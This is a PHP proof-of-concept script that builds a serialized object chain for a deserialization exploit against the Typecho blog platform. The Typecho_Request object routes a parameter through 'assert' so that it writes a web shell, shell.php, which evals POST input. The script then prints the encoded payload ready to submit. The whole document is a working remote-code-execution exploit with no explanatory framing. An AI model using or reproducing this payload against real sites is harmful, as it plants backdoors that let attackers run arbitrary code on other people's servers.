<?php
class Typecho_Request
{
    private $_filter = array();
    private $_params = array();

    public function __construct(){
        $this->_filter[0] = 'assert';
        $this->_params['screenName'] = 'file_put_contents("shell.php", "<?php @eval(\$_POST[ghtwf01]); ?>")';
    }
}

class Typecho_Feed
{
    const RSS2 = 'RSS 2.0';
    private $_type;
    private $_items = array();
    public function __construct(){
        $this->_type = self::RSS2;
        $this->_items[0] = array(
            'author' => new Typecho_Request(),
        );
    }
}

$final = new Typecho_Feed();
$poc = array(
    'adapter' => $final,
    'prefix' => 'typecho_'
);
echo urlencode(base64_encode(serialize($poc)));
?>